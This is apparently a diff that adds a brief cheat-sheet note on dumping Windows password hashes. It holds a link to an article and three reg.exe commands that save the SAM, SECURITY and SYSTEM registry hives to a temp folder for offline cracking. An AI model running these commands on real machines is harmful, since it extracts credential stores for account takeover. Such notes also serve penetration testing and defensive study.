@@ -1,0 +1,6 @@
+# Dump SAM hashes from windows
+
+https://www.securusglobal.com/community/2013/12/20/dumping-windows-credentials/
+C:> reg.exe save hklm\sam c:\temp\sam.save
+C:> reg.exe save hklm\security c:\temp\security.save
+C:> reg.exe save hklm\system c:\temp\system.save
